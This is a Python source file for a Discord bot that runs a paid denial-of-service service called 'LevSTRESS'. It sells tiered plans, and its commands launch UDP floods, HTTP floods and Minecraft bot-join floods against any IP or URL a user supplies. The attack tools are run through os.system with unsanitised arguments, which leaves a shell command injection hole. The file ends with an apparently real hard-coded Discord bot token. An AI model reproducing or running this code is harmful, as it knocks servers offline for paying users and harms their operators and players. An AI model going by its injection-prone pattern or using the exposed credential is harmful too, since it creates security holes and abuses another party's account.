import threading
import discord
import slot
import os

from discord.ext import commands
from discord.utils import get
from discord import utils

token = ""

channel_id = 1055486520410251345

storm_role = 1037221862087852063

#Blok_Methods
methods_free = ['legitjoin', 'localhost','invaldnames','longnames', 'power', 'spoof', 'spam', 'killer', 'nullping', 'charonbot', 'packet', 'queue', 'sf', 'ultimatesmasher', 'nabcry', 'colorcrasher', 'yoonikscry', 'nettydowner', 'network', 'bighandshake', 'randombytes', 'botjoiner', 'multikiller', 'extremejoin', 'spamjoin', 'ram', 'stress']
methods_gold = ['legitjoin', 'localhost','invaldnames','longnames', 'power', 'spoof', 'spam', 'killer', 'nullping', 'charonbot', 'packet', 'queue', 'sf', 'ultimatesmasher', 'nabcry', 'colorcrasher', 'nettydowner', 'bigpacket', 'network', 'bighandshake', 'bigpacket ', 'randombytes', 'botjoiner', 'multikiller', 'extremejoin', 'bigpacket', 'spamjoin', 'ram,']
methods_storm = ['legitjoin', 'localhost','invaldnames', 'power', 'spoof', 'spam', 'killer', 'nullping', 'charonbot', 'packet', 'queue', 'sf', 'ultimatesmasher', 'nabcry', 'colorcrasher', 'nettydowner', 'bigpacket', 'network', 'bighandshake', 'randombytes', 'botjoiner', 'multikiller', 'spamjoin']

bot = commands.Bot(command_prefix="%", intents=discord.Intents.all())
bot.remove_command('help')

#Help
@bot.command()
async def help(ctx):
    embed=discord.Embed(title="Menu", color=0x00FF00)
    embed.add_field(name="**Attack Free**", value="``%free <IP:PORT> <PROTOCOL> <METHOD-FREE>``", inline=False)
    embed.add_field(name="**Attack Gold**", value="``%gold <IP:PORT> <PROTOCOL> <METHOD-GOLD>``", inline=False)
    embed.add_field(name="**Attack Storm**", value="``%storm <IP:PORT> <PROTOCOL> <METHOD-STORM> <TARGETCPS>``", inline=False)
    embed.add_field(name="**UDP Flood Storm**", value="``%udp <IP> <PORT>``", inline=False)
    embed.add_field(name="**HTTP Flood Storm**", value="``%http <URL>``", inline=False)
    embed.add_field(name="**Proxy Update**", value="``%proxies``", inline=False)
    embed.add_field(name="**Protocols list**", value="``%authors``", inline=False)
    embed.add_field(name="**Methods list**", value="``%methods``", inline=False)
    embed.set_footer(text="By z1kh#0154")
    await ctx.send(embed=embed)

#Protocols
@bot.command()
async def protocols(ctx):
    embed=discord.Embed(title="Menu", color=0x00FF00)
    embed.add_field(name='**1.19.0**', value='``759``', inline=False)
    embed.add_field(name='**1.17.0*', value='``755``', inline=False)
    embed.add_field(name='**1.16.3**', value='``753``', inline=False)
    embed.add_field(name='**1.18.2**', value='``758``', inline=False)
    embed.add_field(name='**1.17.1**', value='``756``', inline=False)
    embed.add_field(name='**1.16.5**', value='``754``', inline=False)
    embed.add_field(name='**1.16.4**', value='``754``', inline=False)
    embed.add_field(name='**1.16.2**', value='``751``', inline=False)
    embed.add_field(name='**1.14.4**', value='``498``', inline=False)
    embed.add_field(name='**1.12.2**', value='``340``', inline=False)
    embed.set_footer(text="By sjcraz#6666")
    await ctx.send(embed=embed) 

#authors
@bot.command()
async def authors(ctx):
    embed=discord.Embed(title="Menu", color=0x00FF00)
    embed.add_field(name='**Лев Лойфи#5272**', value='``dev 3``', inline=False) 
    await ctx.send(embed=embed) 

#Methods
@bot.command()
async def methods(ctx):
    embed=discord.Embed(title="Menu", color=0x00FF00)
    embed.add_field(name='**ram**', value='``Один из лучших методов заходят кучу ботов``', inline=False)
    embed.add_field(name='**bigpacket**', value='``отпровляет большой пакет на сервер``', inline=False)
    embed.add_field(name='**ping**', value='``У всех взлетает пинг до небес``', inline=False)
    embed.add_field(name='**join**', value='``Боты заходят и выходят``', inline=False)
    embed.add_field(name='**botnet**', value='``По соединению ебашит``', inline=False)
    embed.add_field(name='**longnames**', value='``Делает сильно длинные ники и за чего может нагрузится``', inline=False)
    embed.add_field(name='**yoonikscry**', value='``Расшатывает сервер и делает его не стабильным``', inline=False)
    embed.add_field(name='**extremejoin**', value='``Сильно флудит входом и выходом``', inline=False)
    embed.add_field(name='**packet**', value='``отпровляет пакеты на сервер`', inline=False)
    embed.add_field(name='**Spam**', value='``Заходят боты, и начинается спам атака`', inline=False)
    embed.set_footer(text="By z1kh#0154")
    await ctx.send(embed=embed)

#Proxies
@bot.command()
async def proxies(ctx):
    def proxies():
        os.system('python proxies.py')

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    t1 = threading.Thread(target=proxies)
    t1.start()

    await ctx.send('``Proxies Loaded!``')

#Plans
@bot.command()
async def plans(ctx):

    await ctx.send('''``Plan: Free
Power: 1000 Bots/sec 
Max power: 5000 Bots/sec
Load Test Time: 30 Seconds 
Methods: join, ping

Plan: Gold - 50p
Power: 5000 Bots/sec 
Max power: 10000 Bots/sec 
Load Test Time: 60 Seconds
Methods: join, ping, botnet, yoonikscry, spam

Plan: Storm 100p
Power: 10000 Bots/sec 
Max power: 30000 Bots/sec 
Load Test Time: 80 Seconds
Methods:

join, ping, stress, yoonikscry,
extremejoin, ram, longnames, packet, spam

+ Access to UDP-Flood
+ Access to HTTP-Flood``''')

#UDP Flood
@bot.command()
@commands.has_role(storm_role)
async def udp(ctx, ip, port):
    def udp():
        os.system(f"python UDP-Flood.py {ip} {port} 30")
    embed=discord.Embed(title="UDP-Flood", color=0x00FF00)
    embed.add_field(name='HOST:', value=f'`` {ip} ``', inline=True)
    embed.add_field(name='PORT', value=f'`` {port} ``', inline=True)
    embed.add_field(name='TIME:', value='`` 50 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/jhjTFfRWmHnPoWew.gif')
    embed.set_footer(text="LevSTRESS. Все права защищены. | By Лев Лойфи# 5272  ")

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    t1 = threading.Thread(target=udp)
    t1.start()

    await ctx.send(embed=embed)

#HTTP Flood
@bot.command()
@commands.has_role(storm_role)
async def http(ctx, url):
    def http():
        os.system(f"node URL-Flood.js {url} 30 RAW 5")
    embed=discord.Embed(title="HTTP-Flood", color=0x00FF00)
    embed.add_field(name='HOST:', value=f'`` {url} ``', inline=True)
    embed.add_field(name='THREADS', value=f'`` 5 ``', inline=True)
    embed.add_field(name='TIME:', value='`` 100 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/jhjTFfRWmHnPoWew.gif')
    embed.set_footer(text="LevSTRESS. Все права защищены. | By Лев Лойфи# 5272  ")

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    t1 = threading.Thread(target=http)
    t1.start()

    await ctx.send(embed=embed)

#Attack Free
@bot.command()
@commands.has_role(storm_role)
async def free(ctx, ip, protocol, method):  
    def free():
        os.system(f"java -jar MCStorm.jar {ip} {protocol} {method} 40 1500")
    embed=discord.Embed(title="Attack sent.", color=0x00FF00)
    embed.add_field(name='IP:PORT:', value=f'`` {ip} ``', inline=True)
    embed.add_field(name='TARGETCPS:', value=f'`` 1000 ``', inline=True)
    embed.add_field(name='METHOD:', value=f'`` {method} ``', inline=True)
    embed.add_field(name='PROTOCOL:', value=f'`` {protocol} ``', inline=True)
    embed.add_field(name='TIME:', value='`` 30 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/jhjTFfRWmHnPoWew.gif')
    embed.set_footer(text="LevSTRESS. Все права защищены. | By Лев Лойфи#5272 ")

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    if method in methods_free:
        embed=discord.Embed(title="``❌ Этот метод недействителен. | Купи Gold или Storm)``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=free)
    t1.start()

    await ctx.send(embed=embed)

#Attack Gold
@bot.command()
@commands.has_role(storm_role)
async def gold(ctx, ip, protocol, method):  
    def gold():
        os.system(f"java -jar MCStorm.jar {ip} {protocol} {method} 60 10000")
    embed=discord.Embed(title="Attack sent.", color=0x00FF00)
    embed.add_field(name='IP:PORT:', value=f'`` {ip} ``', inline=True)
    embed.add_field(name='TARGETCPS:', value=f'`` 10000 ``', inline=True)
    embed.add_field(name='METHOD:', value=f'`` {method} ``', inline=True)
    embed.add_field(name='PROTOCOL:', value=f'`` {protocol} ``', inline=True)
    embed.add_field(name='TIME:', value='`` 60 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/jhjTFfRWmHnPoWew.gif')
    embed.set_footer(text="(DdoS conf ). Все права защищены. | By  ")

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    if method in methods_gold:
        embed=discord.Embed(title="``❌ Этот метод недействителен. | Купи Storm)``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=gold)
    t1.start()

    await ctx.send(embed=embed)

#Attack Storm
@bot.command()
@commands.has_role(storm_role)
async def storm(ctx, ip, protocol, method, cps):  
    def storm():
        os.system(f"java -jar MCStorm.jar {ip} {protocol} {method} 60 {cps}")
    embed=discord.Embed(title="Attack sent.", color=0x00FF00)
    embed.add_field(name='IP:PORT:', value=f'`` {ip} ``', inline=True)
    embed.add_field(name='TARGETCPS:', value=f'`` {cps} ``', inline=True)
    embed.add_field(name='METHOD:', value=f'`` {method} ``', inline=True)
    embed.add_field(name='PROTOCOL:', value=f'`` {protocol} ``', inline=True)
    embed.add_field(name='TIME:', value='`` 80 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/jhjTFfRWmHnPoWew.gif')
    embed.set_footer(text="LevSTRESS. Все права защищены. | By Лев Лойфи# 5272 ")

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return 

    if method in methods_storm:
        embed=discord.Embed(title="``❌ Этот метод недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=storm)
    t1.start()

    await ctx.send(embed=embed)
















































































bot.run('MTA1NTQ1MTQwMDMyMDA1NzM3NA.GNpohi.8wF0PfM_SXEEk5lX1ksU7GFYAH-9M4h6iadjtU')